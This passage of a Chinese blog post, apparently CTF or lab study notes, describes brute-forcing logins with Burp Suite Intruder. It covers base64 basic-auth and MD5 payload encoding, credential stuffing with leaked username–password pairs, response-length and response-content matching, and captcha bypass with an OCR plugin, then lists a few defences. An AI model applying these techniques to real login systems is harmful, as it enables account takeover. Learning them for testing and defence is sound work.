-<li>打开发现是一个类似于basic认证的框，输入数据抓包。<br>发现是base64加密字段，推测basic字段是 用户名：密码 这种格式的base64加密形式。在xintruder中添加basic的加密字段，payload1选择自定义迭代器（Custom itermtor）。<br>然后设置定位分隔符和用户名，在位置2添加密码即可<br>然后在有效荷载里面添加base64编码模块<br>因为base64会自动编码特殊字符，需要取消后面的payload url自动编码</li>
-</ul>
-<h3 id="前端加密爆破"><a href="#前端加密爆破" class="headerlink" title="前端加密爆破"></a>前端加密爆破</h3><ul>
-<li>随便输入密码，发现密码是一串MD5值，解密发现是输入的密码，猜测是前端加密，同样的发送到intruder模块进行设置。<br>在payload的编码设置添加hash的md5加密模块</li>
-</ul>
-<h3 id="泄露数据撞库"><a href="#泄露数据撞库" class="headerlink" title="泄露数据撞库"></a>泄露数据撞库</h3><p><img src="/posts/29527/First.png" alt="例题"></p>
-<ul>
-<li>bp抓包，清掉所有变量，标记密码用户名，选择音叉攻击（一一对应的攻击），导入密码用户名开始攻击。通过返回长度找到正确的账号密码。<br><img src="/posts/29527/Second.png"></li>
-</ul>
-<h3 id="返回包特征提取爆破"><a href="#返回包特征提取爆破" class="headerlink" title="返回包特征提取爆破"></a>返回包特征提取爆破</h3><p><img src="/posts/29527/3.png"><br>若登陆成功和登陆失败返回的长度一样，则在options添加选项中，从返回包中获取返回的字段，可以直接在返回包中看到结果  </p>
-<h3 id="数据包传输类型"><a href="#数据包传输类型" class="headerlink" title="数据包传输类型"></a>数据包传输类型</h3><ul>
-<li>application….from urlLencode</li>
-<li>payload打开密码字典以换行为分割</li>
-<li>批量请求，寻找flag</li>
-</ul>
-<h3 id="简单的token验证"><a href="#简单的token验证" class="headerlink" title="简单的token验证"></a>简单的token验证</h3><ul>
-<li>token时间戳验证</li>
-</ul>
-<h3 id="识别验证码爆破"><a href="#识别验证码爆破" class="headerlink" title="识别验证码爆破"></a>识别验证码爆破</h3><p><img src="/posts/29527/4.png"></p>
-<ul>
-<li>工具：PKAV HTTP Fuzzer</li>
-<li>验证码识别重放模式为单线程</li>
-<li>这次比之前增加了验证码验证模块，码源提示ocr，容易想到利用burp的插件来进行验证码识别爆破。<br>这里用的是captcha-killer插件，开源地址：<a href="http://github.com/c0ny1/captcha-killer">http://github.com/c0ny1/captcha-killer</a><br>先利用burp抓取生成验证码页面，发送到插件的验证码识别模块。</li>
-</ul>
-<h2 id="防止爆破的方法"><a href="#防止爆破的方法" class="headerlink" title="防止爆破的方法"></a>防止爆破的方法</h2><ul>
-<li>多因素认证，爆破次数太多会锁定，但漏洞会导致管理也无法登录。</li>
-<li>sso————统一登陆认证</li>
-<li>加密</li>
-<li>token</li>
-<li>验证码</li>
 </ul>
 ]]></content>
       <tags>
